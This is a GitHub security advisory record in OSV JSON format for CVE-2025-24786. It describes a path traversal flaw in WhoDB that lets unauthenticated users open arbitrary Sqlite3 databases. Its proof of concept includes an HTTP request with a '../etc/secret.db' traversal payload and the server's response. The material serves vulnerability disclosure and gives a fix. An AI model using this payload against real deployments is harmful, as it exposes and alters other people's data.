{
  "id": "GHSA-9r4c-jwx3-3j76",
  "modified": "2025-02-07T23:11:52.602387Z",
  "published": "2025-02-06T19:58:24Z",
  "aliases": [
    "CVE-2025-24786",
    "GO-2025-3456"
  ],
  "summary": "WhoDB has a path traversal opening Sqlite3 database",
  "details": "### Summary\n\nWhile the application only displays Sqlite3 databases present in the directory `/db`, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.\n\n### Details\n\nWhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in `/db/` (or alternatively `./tmp/` if development mode is enabled). Source: https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20\n\nIf no databases are present in the default directory, the UI indicates that the user is unable to open any databases:\n\n![2025-01-22-12-12-42](https://github.com/user-attachments/assets/98ffbcf6-907d-4f90-bf11-2c921b2d93b3)\n\nThe database file is an user-controlled value. This value is used in `.Join()` with the default directory, in order to get the full path of the database file to open. Source: https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26\n\nNo checks are performed whether the database file that is eventually opened actually resides in the default directory `/db`.\n\nThis allows an attacker to use path traversal (`../../`) in order to open any Sqlite3 database present on the system. \n\n### PoC\n\nBefore running the container, an example Sqlite3 database with dummy \"secret\" data was created:\n```sh\nDB_FILE=$(mktemp)\necho \"CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES ('secret data')\" | sqlite3 \"$DB_FILE\"\n```\n\nThe container was then created with nothing mounted into `/db`, and the dummy database mounted into `/etc/secret.db`:\n```sh\npodman run -d -p 8080:8080 -v \"$DB_FILE\":/etc/secret.db docker.io/clidey/whodb\n```\n\nThe attacker sends a HTTP request to determine whether the `secret.db` is accessible by setting the `Database` value to `../etc/secret.db`:\n```http\nPOST /api/query HTTP/1.1\nHost: localhost:8080\ncontent-type: application/json\n...\n\n{\"operationName\":\"Login\",\"variables\":{\"credentials\":{\"Type\":\"Sqlite3\",\"Hostname\":\"\",\"Database\":\"../etc/secret.db\",\"Username\":\"\",\"Password\":\"\",\"Advanced\":[]}},\"query\":\"mutation Login($credentials: LoginCredentials!) {\\n  Login(credentials: $credentials) {\\n    Status\\n    __typename\\n  }\\n}\"}\n```\n\nThe server response indicates that the database was successfully opened:\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=/; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly\n...\n\n{\"data\":{\"Login\":{\"Status\":true,\"__typename\":\"StatusResponse\"}}}\n```\n\nThe `Set-Cookie` `Token` value is simply a Base64-encoded string with a JSON payload containing the connection details:\n```json\n{\n  \"Type\": \"Sqlite3\",\n  \"Hostname\": \"\",\n  \"Username\": \"\",\n  \"Password\": \"\",\n  \"Database\": \"../etc/secret.db\"\n}\n``` \n\nThe attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the `Database` value to `../etc/secret.db`.\n\nDoing so, the attacker can then browse the database, its tables and the data within:\n\n![2025-01-22-12-36-25](https://github.com/user-attachments/assets/c28f1273-7a3c-49e8-bb73-d08a09c7521d)\n\nThe attacker may also insert or modify data using either the buttons presented in the UI or the _Scratchpad_ functionality. In this proof-of-concept, the attacker inserts a new row using the _Add Row_ button:\n\n![2025-01-22-12-36-49](https://github.com/user-attachments/assets/dbd86beb-9969-464c-9a28-a19d470d0f52)\n\n### Impact\n\nAllows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.\n\nThe attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.\n\n### Recommendations\n\nBefore attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.",
  "affected": [
    {
      "package": {
        "ecosystem": "Go",
        "name": "github.com/clidey/whodb/core",
        "purl": "pkg:golang/github.com/clidey/whodb/core"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.0.0-20250127172032-547336ac73c8"
            }
          ]
        }
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/02/GHSA-9r4c-jwx3-3j76/GHSA-9r4c-jwx3-3j76.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24786"
    },
    {
      "type": "WEB",
      "url": "https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/clidey/whodb"
    },
    {
      "type": "WEB",
      "url": "https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20"
    },
    {
      "type": "WEB",
      "url": "https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26"
    }
  ]
}